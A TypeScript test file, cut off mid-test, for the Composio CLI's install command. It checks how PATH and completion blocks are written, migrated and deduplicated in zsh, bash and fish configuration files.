import path from 'node:path';
import { Writable } from 'node:stream';
import { beforeEach, vi } from 'vitest';
import { describe, expect, layer } from '@effect/vitest';
import { ConfigProvider, Effect, Exit } from 'effect';
import { FileSystem } from '@effect/platform';
import { NodeOs } from 'src/services/node-os';
import {
  installShellIntegration,
  ShellSetupAbortError,
  type Shell,
} from 'src/commands/install.cmd';
import { makeTerminalUI } from 'src/services/terminal-ui';
import { extendConfigProvider } from 'src/services/config';
import { cli, TestLive, MockConsole } from 'test/__utils__';

const makeSink = (isTTY: boolean) => {
  const chunks: string[] = [];
  const sink = new Writable({
    write(chunk, _encoding, callback) {
      chunks.push(String(chunk));
      callback();
    },
  });
  return Object.assign(sink, { isTTY, chunks });
};

const capturedStdout = makeSink(true);
const capturedStderr = makeSink(false);
const capturedStderrUI = makeTerminalUI({
  stdin: { isTTY: true },
  stdout: capturedStdout,
  stderr: capturedStderr,
});

// A PATH that never contains a test's resolved bin dir. The default fallback
// bin dir (no COMPOSIO_BIN_DIR, no ~/.local/bin/composio) is `dirname(TEST_EXEC_PATH)`,
// which is frequently already on the host's real PATH (a Node/Bun/mise shim
// dir) — exactly what tests must not depend on, so this always overrides it.
const SAFE_PATH = '/usr/bin:/bin';
const TEST_EXEC_PATH = '/usr/local/bin/composio';
const expectedRuntimeBinDir = (): string => path.dirname(TEST_EXEC_PATH);
const InstallTestLive = (input: Parameters<typeof TestLive>[0] = {}) =>
  TestLive({
    baseConfigProvider: ConfigProvider.fromEnv().pipe(extendConfigProvider),
    execPath: TEST_EXEC_PATH,
    ...input,
  });
const install = (
  params: {
    readonly completions?: boolean;
    readonly shell?: Shell;
  } = {}
) =>
  installShellIntegration({
    completions: params.completions ?? false,
    shell: params.shell,
  });

// The atomic-write tmp name embeds the pid, so litter checks scan the target's
// directory for any `.composio-tmp` remnant instead of probing one fixed name.
const expectNoTmpLitter = (fs: FileSystem.FileSystem, targetPath: string) =>
  Effect.gen(function* () {
    const entries = yield* fs.readDirectory(path.dirname(targetPath));
    expect(entries.filter(name => name.includes('.composio-tmp'))).toEqual([]);
  });

// NOTE: `@effect/vitest`'s `layer(...)` builds one shared TestLive instance
// (home dir, MockConsole buffer, etc.) for every `it.scoped` nested inside a
// single call. Sharing is only safe when a later test doesn't read state a
// prior test mutated (MockConsole output, rc files under the shared home
// dir) — so each independent scenario below gets its own `layer(...)` call,
// mirroring the file's existing single-test blocks. The two-test blocks that
// remain (zsh's symlink test, the stderr-capture pair) are safe because the
// second test never reads `MockConsole` and resets any file state it cares
// about itself.

describe('CLI: composio install', () => {
  beforeEach(() => {
    // vitest.config.ts sets `unstubEnvs: true`, so every `vi.stubEnv` call
    // below is automatically reverted after each test — no manual save/restore.
    vi.stubEnv('PATH', SAFE_PATH);
    vi.stubEnv('COMPOSIO_BIN_DIR', '');
    vi.stubEnv('COMPOSIO_CLI_INVOCATION_ORIGIN', undefined);
    capturedStdout.chunks.length = 0;
    capturedStderr.chunks.length = 0;
  });

  describe('[When] shell is zsh', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] creates .zshrc with PATH only by default', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/zsh');
          // A direct invocation (no installer origin) keeps the restart hint.
          vi.stubEnv('COMPOSIO_CLI_INVOCATION_ORIGIN', '');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const rcPath = path.join(os.homedir, '.zshrc');
          const contents = yield* fs.readFileString(rcPath);

          expect(contents).toContain('# Composio CLI');
          expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).not.toContain('# Composio CLI completions');

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('Detected shell: zsh');
          expect(output).toContain('PATH: will add');
          expect(output).toContain('Completions: skipped for zsh');
          expect(output).toContain('Updated');
          expect(output).toContain('Restart your shell to apply changes');
          expect(output).toContain('source ~/.zshrc');
        })
      );

      it.scoped('[Then] preserves a symlinked .zshrc', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');

          const rcPath = path.join(os.homedir, '.zshrc');
          const managedPath = path.join(os.homedir, '.managed-zshrc');
          const linkTarget = path.basename(managedPath);
          yield* fs.remove(rcPath, { force: true });
          yield* fs.writeFileString(managedPath, '# managed shell config\n');
          yield* fs.symlink(linkTarget, rcPath);

          yield* install();

          expect(yield* fs.readLink(rcPath)).toBe(linkTarget);
          expect(yield* fs.readFileString(managedPath)).toContain('# Composio CLI');
          yield* expectNoTmpLitter(fs, rcPath);
        })
      );
    });
  });

  describe('[When] shell is bash', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] creates .bashrc with PATH only by default', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/bash');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const rcPath = path.join(os.homedir, '.bashrc');
          const contents = yield* fs.readFileString(rcPath);

          expect(contents).toContain('# Composio CLI');
          expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).not.toContain('# Composio CLI completions');
        })
      );
    });
  });

  describe('[When] bash has neither .bash_profile nor .bash_login', () => {
    layer(InstallTestLive())(it => {
      // A login bash (macOS Terminal.app's default) never reads .bashrc, so
      // the PATH block only reaches it through a created .bash_profile.
      it.scoped('[Then] .bash_profile is created alongside .bashrc', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/bash');
          const expectedBinDir = expectedRuntimeBinDir();

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const bashProfilePath = path.join(os.homedir, '.bash_profile');
          expect(yield* fs.exists(path.join(os.homedir, '.bashrc'))).toBe(true);
          expect(yield* fs.exists(bashProfilePath)).toBe(true);
          expect(yield* fs.exists(path.join(os.homedir, '.bash_login'))).toBe(false);

          const bashProfileContents = yield* fs.readFileString(bashProfilePath);
          expect(bashProfileContents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          // No ~/.profile existed, so nothing had to be sourced back.
          expect(bashProfileContents).not.toContain('.profile');
        })
      );
    });
  });

  describe('[When] bash has no login file but an existing ~/.profile', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the created .bash_profile sources ~/.profile, which stays untouched', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');
          const expectedBinDir = expectedRuntimeBinDir();

          const profilePath = path.join(os.homedir, '.profile');
          yield* fs.writeFileString(profilePath, '# distro profile\n');

          yield* install();

          const bashProfileContents = yield* fs.readFileString(
            path.join(os.homedir, '.bash_profile')
          );
          expect(bashProfileContents).toContain('. "$HOME/.profile"');
          expect(bashProfileContents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          // The passthrough must precede the managed block it leads into.
          expect(bashProfileContents.indexOf('. "$HOME/.profile"')).toBeLessThan(
            bashProfileContents.indexOf('# Composio CLI')
          );
          expect(yield* fs.readFileString(profilePath)).toBe('# distro profile\n');
        })
      );
    });
  });

  describe('[When] bash has an existing .bash_profile', () => {
    layer(InstallTestLive())(it => {
      it.scoped(
        '[Then] the PATH block also lands in .bash_profile, and the restart hint mentions it',
        () =>
          Effect.gen(function* () {
            const os = yield* NodeOs;
            const fs = yield* FileSystem.FileSystem;
            vi.stubEnv('SHELL', '/bin/bash');

            const bashProfilePath = path.join(os.homedir, '.bash_profile');
            yield* fs.writeFileString(bashProfilePath, '# existing login config\n');

            yield* install();

            const bashrcContents = yield* fs.readFileString(path.join(os.homedir, '.bashrc'));
            const bashProfileContents = yield* fs.readFileString(bashProfilePath);
            expect(bashrcContents).toContain('# Composio CLI');
            expect(bashProfileContents).toContain('# Composio CLI');

            const lines = yield* MockConsole.getLines();
            const output = lines.join('\n');
            expect(output).toContain('source ~/.bashrc');
            expect(output).toContain('~/.bash_profile');
            expect(output).toContain('login shell');
            expect(output).not.toContain('exec $SHELL');
          })
      );
    });
  });

  describe('[When] bash updates a private .bash_profile', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] preserves its existing file mode', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');

          const bashProfilePath = path.join(os.homedir, '.bash_profile');
          yield* fs.writeFileString(bashProfilePath, '# private login config\n');
          yield* fs.chmod(bashProfilePath, 0o600);

          yield* install();

          const info = yield* fs.stat(bashProfilePath);
          expect(info.mode & 0o777).toBe(0o600);
          yield* expectNoTmpLitter(fs, bashProfilePath);
        })
      );
    });
  });

  describe('[When] bash has only .bash_login (no .bash_profile)', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the PATH block also lands in .bash_login', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');

          const bashLoginPath = path.join(os.homedir, '.bash_login');
          yield* fs.writeFileString(bashLoginPath, '# existing login config\n');

          yield* install();

          const bashrcContents = yield* fs.readFileString(path.join(os.homedir, '.bashrc'));
          const bashLoginContents = yield* fs.readFileString(bashLoginPath);
          expect(bashrcContents).toContain('# Composio CLI');
          expect(bashLoginContents).toContain('# Composio CLI');

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('source ~/.bashrc');
          expect(output).toContain('~/.bash_login');
          expect(output).toContain('login shell');
        })
      );
    });
  });

  describe('[When] bash has both .bash_profile and .bash_login', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] only .bash_profile receives the login PATH block', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');

          const bashProfilePath = path.join(os.homedir, '.bash_profile');
          const bashLoginPath = path.join(os.homedir, '.bash_login');
          yield* fs.writeFileString(bashProfilePath, '# existing profile\n');
          yield* fs.writeFileString(bashLoginPath, '# existing login\n');

          yield* install();

          const bashProfileContents = yield* fs.readFileString(bashProfilePath);
          const bashLoginContents = yield* fs.readFileString(bashLoginPath);
          expect(bashProfileContents).toContain('# Composio CLI');
          expect(bashLoginContents).not.toContain('# Composio CLI');
        })
      );
    });
  });

  describe('[When] .bash_profile is symlinked to the same file as .bashrc', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the PATH block is written exactly once, not once per alias', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');

          const bashrcPath = path.join(os.homedir, '.bashrc');
          const bashProfilePath = path.join(os.homedir, '.bash_profile');
          const managedPath = path.join(os.homedir, '.managed-bashrc');
          yield* fs.remove(bashrcPath, { force: true });
          yield* fs.writeFileString(managedPath, '# managed shell config\n');
          yield* fs.symlink(managedPath, bashrcPath);
          yield* fs.symlink(managedPath, bashProfilePath);

          yield* install();

          const contents = yield* fs.readFileString(managedPath);
          const pathMarkerCount = contents.match(/^# Composio CLI$/gm)?.length ?? 0;
          expect(pathMarkerCount).toBe(1);
        })
      );
    });
  });

  describe('[When] shell is fish', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] creates config.fish with PATH only by default', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/usr/bin/fish');

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const rcPath = path.join(os.homedir, '.config', 'fish', 'config.fish');
          const contents = yield* fs.readFileString(rcPath);

          expect(contents).toContain('# Composio CLI');
          expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
          expect(contents).toContain('set --export PATH');
          expect(contents).not.toContain('# Composio CLI completions');
        })
      );
    });
  });

  describe('[When] --completions is passed', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] writes PATH block and installs completions', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/bash');

          yield* install({ completions: true });

          const fs = yield* FileSystem.FileSystem;
          const rcPath = path.join(os.homedir, '.bashrc');
          const contents = yield* fs.readFileString(rcPath);

          expect(contents).toContain('# Composio CLI');
          expect(contents).toContain('# Composio CLI completions');

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('Completions: will install shell completions');
        })
      );
    });
  });

  describe('[When] fish shell installs completions', () => {
    layer(InstallTestLive())(it => {
      it.scoped(
        '[Then] keeps PATH setup in config.fish and writes completions to composio.fish',
        () =>
          Effect.gen(function* () {
            const os = yield* NodeOs;
            vi.stubEnv('SHELL', '/usr/bin/fish');

            yield* install({ completions: true });

            const fs = yield* FileSystem.FileSystem;
            const configPath = path.join(os.homedir, '.config', 'fish', 'config.fish');
            const completionPath = path.join(
              os.homedir,
              '.config',
              'fish',
              'completions',
              'composio.fish'
            );
            const configContents = yield* fs.readFileString(configPath);
            const completionContents = yield* fs.readFileString(completionPath);

            expect(configContents).toContain('# Composio CLI');
            expect(configContents).toContain('set --export PATH');
            expect(configContents).not.toContain('# Composio CLI completions');

            expect(completionContents).toContain('# Composio CLI completions');

            const lines = yield* MockConsole.getLines();
            const output = lines.join('\n');
            expect(output).toContain('Completions: will install fish completions to');
            expect(output).toContain('Updated ~/.config/fish/config.fish');
            expect(output).toContain('Updated ~/.config/fish/completions/composio.fish');
            expect(output).toContain('exec fish');
          })
      );
    });
  });

  describe('[When] fish config and completions are symlinked to the same file', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] keeps both PATH and completions blocks', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/usr/bin/fish');

          const configPath = path.join(os.homedir, '.config', 'fish', 'config.fish');
          const completionPath = path.join(
            os.homedir,
            '.config',
            'fish',
            'completions',
            'composio.fish'
          );
          const managedPath = path.join(os.homedir, '.managed-fish-config');
          yield* fs.makeDirectory(path.dirname(completionPath), { recursive: true });
          yield* fs.remove(configPath, { force: true });
          yield* fs.writeFileString(managedPath, '# managed fish config\n');
          yield* fs.symlink(managedPath, configPath);
          yield* fs.symlink(managedPath, completionPath);

          yield* install({ completions: true });

          const contents = yield* fs.readFileString(managedPath);
          const pathMarkerCount = contents.match(/^# Composio CLI$/gm)?.length ?? 0;
          const completionsMarkerCount =
            contents.match(/^# Composio CLI completions$/gm)?.length ?? 0;
          expect(pathMarkerCount).toBe(1);
          expect(completionsMarkerCount).toBe(1);
        })
      );
    });
  });

  describe('[When] fish shell installs completions twice', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] keeps config.fish and composio.fish idempotent', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/usr/bin/fish');

          yield* install({ completions: true });
          yield* install({ completions: true });

          const fs = yield* FileSystem.FileSystem;
          const configPath = path.join(os.homedir, '.config', 'fish', 'config.fish');
          const completionPath = path.join(
            os.homedir,
            '.config',
            'fish',
            'completions',
            'composio.fish'
          );
          const configContents = yield* fs.readFileString(configPath);
          const completionContents = yield* fs.readFileString(completionPath);

          const pathMarkerCount = configContents.match(/^# Composio CLI$/gm)?.length ?? 0;
          const configCompletionsCount =
            configContents.match(/^# Composio CLI completions$/gm)?.length ?? 0;
          const fishCompletionsCount =
            completionContents.match(/^# Composio CLI completions$/gm)?.length ?? 0;

          expect(pathMarkerCount).toBe(1);
          expect(configCompletionsCount).toBe(0);
          expect(fishCompletionsCount).toBe(1);
        })
      );
    });
  });

  describe('[When] --no-completions is passed', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] writes PATH block but skips completions', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/zsh');

          yield* install();

          const fs = yield* FileSystem.FileSystem;
          const rcPath = path.join(os.homedir, '.zshrc');
          const contents = yield* fs.readFileString(rcPath);

          expect(contents).toContain('# Composio CLI');
          expect(contents).not.toContain('# Composio CLI completions');

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('Completions: skipped for zsh');
        })
      );
    });
  });

  describe('[When] install is run twice (idempotency)', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] does not duplicate entries', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          vi.stubEnv('SHELL', '/bin/bash');

          // Run install twice
          yield* install({ completions: true });
          yield* install({ completions: true });

          const fs = yield* FileSystem.FileSystem;
          const rcPath = path.join(os.homedir, '.bashrc');
          const contents = yield* fs.readFileString(rcPath);

          // Count occurrences of each marker — should be exactly 1
          // Use regex with word boundary to avoid "# Composio CLI completions" matching "# Composio CLI"
          const pathMarkerCount = contents.match(/^# Composio CLI$/gm)?.length ?? 0;
          expect(pathMarkerCount).toBe(1);

          const completionsCount = contents.match(/^# Composio CLI completions$/gm)?.length ?? 0;
          expect(completionsCount).toBe(1);
        })
      );
    });
  });

  describe('[When] .zshrc already has a managed block recording the current bin dir', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] reports already configured and leaves the file byte-identical', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          // Pre-populate .zshrc with a managed block that is already current.
          const rcPath = path.join(os.homedir, '.zshrc');
          const original = `# existing config\n# Composio CLI\nexport PATH="${expectedBinDir}:$PATH"\n# Composio CLI completions\n_composio() {}\n`;
          yield* fs.writeFileString(rcPath, original);

          yield* install({ completions: true });

          const lines = yield* MockConsole.getLines();
          const output = lines.join('\n');
          expect(output).toContain('PATH: already configured');
          expect(output).toContain('Completions: skipped for zsh');
          expect(output).toContain('Shell integration already configured');
          expect(output).not.toContain('Updated');

          // File must not be rewritten at all.
          const contents = yield* fs.readFileString(rcPath);
          expect(contents).toBe(original);
        })
      );
    });
  });

  describe('[When] the managed PATH block records a stale bin dir', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] replaces only the managed block and keeps unmanaged content', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.writeFileString(
            rcPath,
            '# user prologue\n# Composio CLI\nexport PATH="/stale/bin:$PATH"\n# user epilogue\nalias ll="ls -la"\n'
          );

          yield* install();

          const contents = yield* fs.readFileString(rcPath);
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).not.toContain('/stale/bin');
          expect(contents).toContain('# user prologue');
          expect(contents).toContain('# user epilogue');
          expect(contents).toContain('alias ll="ls -la"');
          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);

          const output = (yield* MockConsole.getLines()).join('\n');
          expect(output).toContain('Updated ~/.zshrc');
        })
      );
    });
  });

  describe('[When] duplicate managed PATH blocks exist in one file', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] they collapse into a single current block', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.writeFileString(
            rcPath,
            `# Composio CLI\nexport PATH="/stale/bin:$PATH"\n# unmanaged line\n# Composio CLI\nexport PATH="${expectedBinDir}:$PATH"\n`
          );

          yield* install();

          const contents = yield* fs.readFileString(rcPath);
          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).not.toContain('/stale/bin');
          expect(contents).toContain('# unmanaged line');
        })
      );
    });
  });

  describe('[When] a user comment sits between the managed marker and the stale export', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the comment survives and the fresh assignment wins PATH precedence', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.writeFileString(
            rcPath,
            '# Composio CLI\n# added by my dotfiles\nexport PATH="/stale/bin:$PATH"\n# user epilogue\n'
          );

          yield* install();

          const contents = yield* fs.readFileString(rcPath);
          // No user content may ever be deleted.
          expect(contents).toContain('# added by my dotfiles');
          expect(contents).toContain('# user epilogue');
          // Exactly one marker, directly followed by the current assignment.
          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
          const newAssignment = `export PATH="${expectedBinDir}:$PATH"`;
          const lines = contents.split('\n');
          const markerIndex = lines.findIndex(line => line.trim() === '# Composio CLI');
          expect(lines[markerIndex + 1]).toBe(newAssignment);
          // Prepend-style exports make the last-sourced assignment win, so the
          // fresh assignment must be removed-or-after any surviving stale one.
          const staleIndex = contents.indexOf('export PATH="/stale/bin:$PATH"');
          expect(contents.indexOf(newAssignment)).toBeGreaterThan(staleIndex);
        })
      );
    });
  });

  describe('[When] a blank line sits between the managed marker and the stale export', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] nothing but the marker is removed and the fresh assignment wins', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.writeFileString(
            rcPath,
            '# user prologue\n# Composio CLI\n\nexport PATH="/stale/bin:$PATH"\n'
          );

          yield* install();

          const contents = yield* fs.readFileString(rcPath);
          expect(contents).toContain('# user prologue');
          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
          const newAssignment = `export PATH="${expectedBinDir}:$PATH"`;
          const lines = contents.split('\n');
          const markerIndex = lines.findIndex(line => line.trim() === '# Composio CLI');
          expect(lines[markerIndex + 1]).toBe(newAssignment);
          const staleIndex = contents.indexOf('export PATH="/stale/bin:$PATH"');
          expect(contents.indexOf(newAssignment)).toBeGreaterThan(staleIndex);
        })
      );
    });
  });

  describe('[When] an rc file carries the legacy install.sh managed block', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the legacy pair is migrated, not left behind or duplicated', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          const expectedBinDir = expectedRuntimeBinDir();

          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.writeFileString(
            rcPath,
            [
              '# user config above',
              '# Composio CLI',
              'export COMPOSIO_INSTALL_DIR="$HOME/.composio"',
              'export PATH="$COMPOSIO_INSTALL_DIR:$PATH"',
              '# user config below',
              '',
            ].join('\n')
          );

          yield* install();

          const contents = yield* fs.readFileString(rcPath);
          expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
          // User content keeps its own relative order; the refreshed block is
          // appended after it, exactly as install.sh's awk rewrite does.
          expect(contents.indexOf('# user config above')).toBeLessThan(
            contents.indexOf('# user config below')
          );
          expect(contents.indexOf('# user config below')).toBeLessThan(
            contents.indexOf('# Composio CLI')
          );
        })
      );
    });
  });

  describe('[When] a legacy block sits above an existing completions block', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] migrating the PATH block leaves the completions block intact', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');
          const expectedBinDir = expectedRuntimeBinDir();

          const rcPath = path.join(os.homedir, '.bashrc');
          yield* fs.writeFileString(
            rcPath,
            [
              '# Composio CLI',
              'export COMPOSIO_INSTALL_DIR="$HOME/.composio"',
              'export PATH="$COMPOSIO_INSTALL_DIR:$PATH"',
              '',
              '# Composio CLI completions',
              '_composio_completions() { :; }',
              '',
            ].join('\n')
          );

          yield* install();

          const contents = yield* fs.readFileString(rcPath);
          expect(contents).not.toContain('COMPOSIO_INSTALL_DIR');
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).toContain('_composio_completions() { :; }');
          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
          expect(contents.match(/^# Composio CLI completions$/gm)?.length ?? 0).toBe(1);
        })
      );
    });
  });

  describe('[When] a migrated rc file is installed into a second time', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the second run is a no-op', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');

          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.writeFileString(
            rcPath,
            '# Composio CLI\nexport COMPOSIO_INSTALL_DIR="$HOME/.composio"\nexport PATH="$COMPOSIO_INSTALL_DIR:$PATH"\n'
          );

          yield* install();
          const afterFirst = yield* fs.readFileString(rcPath);
          yield* install();
          const afterSecond = yield* fs.readFileString(rcPath);

          expect(afterSecond).toBe(afterFirst);
          expect(afterSecond.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
        })
      );
    });
  });

  describe('[When] .bashrc and .bash_profile alias one physical file with a stale managed block', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the physical file ends with exactly one current block', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/bash');
          const expectedBinDir = expectedRuntimeBinDir();

          const bashrcPath = path.join(os.homedir, '.bashrc');
          const bashProfilePath = path.join(os.homedir, '.bash_profile');
          const managedPath = path.join(os.homedir, '.managed-bashrc');
          yield* fs.remove(bashrcPath, { force: true });
          yield* fs.writeFileString(
            managedPath,
            '# managed prologue\n# Composio CLI\nexport PATH="/stale/bin:$PATH"\n'
          );
          yield* fs.symlink(managedPath, bashrcPath);
          yield* fs.symlink(managedPath, bashProfilePath);

          yield* install();

          const contents = yield* fs.readFileString(managedPath);
          expect(contents.match(/^# Composio CLI$/gm)?.length ?? 0).toBe(1);
          expect(contents).toContain(`export PATH="${expectedBinDir}:$PATH"`);
          expect(contents).not.toContain('/stale/bin');
          expect(contents).toContain('# managed prologue');

          // Both aliases must survive as symlinks to the same physical file.
          expect(yield* fs.readLink(bashrcPath)).toBe(managedPath);
          expect(yield* fs.readLink(bashProfilePath)).toBe(managedPath);
          yield* expectNoTmpLitter(fs, managedPath);
        })
      );
    });
  });

  describe('[When] the atomic write cannot replace the target file', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the error propagates and no .composio-tmp file is left behind', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');

          // A directory at the rc path makes the final rename(file, dir) fail
          // after the temp file was already written.
          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.remove(rcPath, { force: true, recursive: true });
          yield* fs.makeDirectory(rcPath);

          const exit = yield* install().pipe(Effect.exit);

          expect(Exit.isFailure(exit)).toBe(true);
          yield* expectNoTmpLitter(fs, rcPath);
        })
      );
    });
  });

  describe('[When] COMPOSIO_CLI_INVOCATION_ORIGIN=installer delegates shell setup', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] keeps the Updated status line but suppresses the restart hint', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_CLI_INVOCATION_ORIGIN', 'installer');

          yield* install();

          const output = (yield* MockConsole.getLines()).join('\n');
          expect(output).toContain('Updated ~/.zshrc');
          expect(output).not.toContain('Restart your shell');
          expect(output).not.toContain('source ~/.zshrc');
        })
      );
    });
  });

  describe('[When] COMPOSIO_CLI_INVOCATION_ORIGIN=installer and integration is already current', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] keeps the already-current status line', () =>
        Effect.gen(function* () {
          const os = yield* NodeOs;
          const fs = yield* FileSystem.FileSystem;
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_CLI_INVOCATION_ORIGIN', 'installer');
          const expectedBinDir = expectedRuntimeBinDir();

          const rcPath = path.join(os.homedir, '.zshrc');
          yield* fs.writeFileString(
            rcPath,
            `# Composio CLI\nexport PATH="${expectedBinDir}:$PATH"\n`
          );

          yield* install();

          const output = (yield* MockConsole.getLines()).join('\n');
          expect(output).toContain('Shell integration already configured');
          expect(output).not.toContain('Restart your shell');
        })
      );
    });
  });

  describe('[When] COMPOSIO_CLI_INVOCATION_ORIGIN has a non-installer value', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] the restart hint still prints', () =>
        Effect.gen(function* () {
          vi.stubEnv('SHELL', '/bin/zsh');
          vi.stubEnv('COMPOSIO_CLI_INVOCATION_ORIGIN', 'agent');

          yield* install();

          const output = (yield* MockConsole.getLines()).join('\n');
          expect(output).toContain('Updated ~/.zshrc');
          expect(output).toContain('Restart your shell to apply changes');
          expect(output).toContain('source ~/.zshrc');
        })
      );
    });
  });

  describe('[When] shell cannot be detected', () => {
    layer(InstallTestLive())(it => {
      it.scoped('[Then] shows manual setup instructions', () =>
